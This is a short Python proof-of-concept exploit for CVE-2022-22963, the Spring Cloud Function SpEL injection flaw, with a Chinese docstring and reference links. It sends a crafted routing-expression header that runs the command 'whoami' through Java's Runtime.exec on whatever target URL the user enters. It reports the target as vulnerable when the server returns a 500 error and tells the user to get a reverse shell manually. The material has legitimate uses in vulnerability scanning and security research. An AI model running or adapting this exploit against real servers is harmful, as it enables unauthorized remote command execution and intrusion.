import requests
requests.packages.urllib3.disable_warnings()

'''
Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）
Spring Cloud Function 提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像 Amazon AWS Lambda 这样的 FaaS（函数即服务，function as a service）平台。

参考链接：

https://tanzu.vmware.com/security/cve-2022-22963
https://mp.weixin.qq.com/s/onYJWIESgLaWS64lCgsKdw
https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f
'''

def poc(url, useragent, proxies=None):
    path = '/functionRouter'
    header = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': useragent,
        'Content-Type': 'application/x-www-form-urlencoded',
        'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("whoami")' # payload
    }
    data = 'test'
    try:
        url = url + path
        req = requests.post(url=url, headers=header, data=data, verify=False, proxies=proxies, timeout=6)
        rsp = '"error":"Internal Server Error"'
        if (req.status_code == 500) and (rsp in req.text):
            return f'[+] CVE-2022-22963 exists, Please bounce the shell manually --> {url}'
        else:
            return "[-] CVE-2022-22963 not exists."
    except Exception as e:
        return f'[-] An error occurred and it has been logged: {e}'

if __name__ == '__main__':
    print(poc(input('请输入目标url:').strip('/'), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'))